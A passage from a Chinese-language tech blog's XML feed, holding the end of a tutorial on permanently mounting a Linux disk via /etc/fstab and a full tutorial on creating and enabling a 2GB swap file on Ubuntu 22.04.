href="#5-设置永久挂载" class="headerlink" title="5.设置永久挂载"></a>5.设置永久挂载</h2><p> <strong>获取UUID</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo blkid /dev/sda1</span><br>/dev/sda1: UUID=&quot;deb8b33b-c908-4dbc-85a5-311727079736&quot; BLOCK_SIZE=&quot;4096&quot; TYPE=&quot;ext4&quot; PARTUUID=&quot;d91cf2eb-01&quot;<br></code></pre></td></tr></table></figure><p><strong>打开 <code>/etc/fstab</code> ，写入<code>UUID=deb8b33b-c908-4dbc-85a5-311727079736     /data   ext4   defaults   0   2</code> 实现永久挂载</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo vim /etc/fstab</span>    <br>UUID=deb8b33b-c908-4dbc-85a5-311727079736     /data   ext4   defaults   0   2<br>UUID=c473537c-547e-48f4-b2ca-a2bc4e0d2f2e     /data   ext4   defaults   0   2<br></code></pre></td></tr></table></figure><h2 id="6-检查"><a href="#6-检查" class="headerlink" title="6.检查"></a>6.检查</h2><p><strong>使用<code>df -h</code>可以检查磁盘挂载是否成功</strong></p><p><img src="/img/course/image-20240410210902334.png" alt="image-20240410210902334"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux磁盘分区与挂载&quot;&gt;&lt;a href=&quot;#Linux磁盘分区与挂载&quot; class=&quot;headerlink&quot; title=&quot;Linux磁盘分区与挂载&quot;&gt;&lt;/a&gt;Linux磁盘分区与挂载&lt;/h1&gt;&lt;h2 id=&quot;1-lsblk查看当前块设备&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
    <category term="服务器运维" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>Linux服务器添加Swap交换空间</title>
    <link href="http://example.com/2024/04/14/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B7%BB%E5%8A%A0Swap%E4%BA%A4%E6%8D%A2%E7%A9%BA%E9%97%B4/"/>
    <id>http://example.com/2024/04/14/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B7%BB%E5%8A%A0Swap%E4%BA%A4%E6%8D%A2%E7%A9%BA%E9%97%B4/</id>
    <published>2024-04-14T11:26:52.000Z</published>
    <updated>2024-04-14T11:42:41.662Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux服务器添加Swap交换空间"><a href="#Linux服务器添加Swap交换空间" class="headerlink" title="Linux服务器添加Swap交换空间"></a>Linux服务器添加Swap交换空间</h1><h3 id="演示环境"><a href="#演示环境" class="headerlink" title="演示环境"></a>演示环境</h3><ul><li>Ubuntu 22.04</li></ul><h3 id="Swap空间简介"><a href="#Swap空间简介" class="headerlink" title="Swap空间简介"></a>Swap空间简介</h3><p>Swap空间是一种虚拟内存空间，用于暂时存储操作系统不需要的数据，以便释放物理内存供其他程序使用。在Linux系统中，Swap空间通常是一个磁盘分区或者一个特殊的文件，用于扩展系统的虚拟内存空间。当系统的物理内存不足时，操作系统会将一部分内存中的数据移到Swap空间中，以释放物理内存。</p><p><strong>由于 Swap 空间位于硬盘上，因此访问速度较慢。</strong></p><h2 id="1-查看当前内存与swap"><a href="#1-查看当前内存与swap" class="headerlink" title="1.查看当前内存与swap"></a>1.查看当前内存与swap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ free -m<br>               total        used        free      shared  buff/cache   available<br>Mem:             883         305         219           3         359         428<br>Swap:              0           0           0<br></code></pre></td></tr></table></figure><h3 id="检查-Swap-空间"><a href="#检查-Swap-空间" class="headerlink" title="检查 Swap 空间"></a>检查 Swap 空间</h3><ol><li>执行以下命令检查 Swap 空间是否存在：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">swapon -s<br></code></pre></td></tr></table></figure><p>如果输出为空，则表示没有 Swap 空间。</p><h2 id="2-创建-Swap-分区"><a href="#2-创建-Swap-分区" class="headerlink" title="2.创建 Swap 分区"></a>2.创建 Swap 分区</h2><ol><li><p>使用 <code>dd</code> 命令创建 2GB 的 Swap 分区（可根据服务器配置调整大小：Swap 空间的大小应根据服务器的实际内存和使用情况进行调整。一般来说，Swap 空间的大小应为实际内存的 1-2 倍。</p><p>使用 <code>if=/dev/zero</code> 创建 Swap 分区的原因是：</p><ul><li>它会创建一个包含零字节的文件，这对于 Swap 分区至关重要，因为 Swap 分区必须包含已知的干净数据。</li><li><code>/dev/zero</code> 是一个特殊文件，它会不断生成零字节，这意味着您可以创建任意大小的 Swap 分区。</li></ul><p>使用 <code>if=/dev/zero</code> 可以确保 Swap 分区从一开始就包含干净的数据，并且可以创建任意大小的 Swap 分区。</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/mnt/swap bs=1M count=2048<br></code></pre></td></tr></table></figure><ol start="2"><li>设置 Swap 分区文件：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkswap /mnt/swap<br></code></pre></td></tr></table></figure><ol start="3"><li>启用 Swap：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">swapon /mnt/swap<br></code></pre></td></tr></table></figure><h2 id="3-启动时自动挂载Swap-分区"><a href="#3-启动时自动挂载Swap-分区" class="headerlink" title="3.启动时自动挂载Swap 分区"></a>3.启动时自动挂载Swap 分区</h2><ol><li>编辑 <code>/etc/fstab</code> 文件，添加以下行：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/mnt/swap swap swap defaults 0 0<br></code></pre></td></tr></table></figure><ul><li><code>/mnt/swap</code>：Swap 分区的挂载点。</li><li><code>swap</code>：指定该分区是 Swap 分区。</li><li><code>swap</code>：指定该分区的文件系统类型是 Swap。</li><li><code>defaults</code>：使用 Swap 分区的默认选项。</li><li><code>0</code>：指定该 Swap 分区在启动时不进行检查。</li><li><code>0</code>：指定该 Swap 分区在启动时不进行转储。</li></ul><h2 id="4-检查swap空间"><a href="#4-检查swap空间" class="headerlink" title="4.检查swap空间"></a>4.检查swap空间</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ swapon -s<br>Filename                                Type            Size            Used            Priority<br>/mnt/swap                               file            2097148         0               -2<br>$ free -h<br>               total        used        free      shared  buff/cache   available<br>Mem:           883Mi       280Mi       157Mi       3.0Mi       445Mi       450Mi<br>Swap:          2.0Gi          0B       2.0Gi                                  <br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux服务器添加Swap交换空间&quot;&gt;&lt;a href=&quot;#Linux服务器添加Swap交换空间&quot; class=&quot;headerlink&quot; title=&quot;Linux服务器添加Swap交换空间&quot;&gt;&lt;/a&gt;Linux服务器添加Swap交换空间&lt;/h1&gt;&lt;h3 id=&quot;演</summary>
      
    
    
    
    
    <category term="服务器运维" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
</feed>
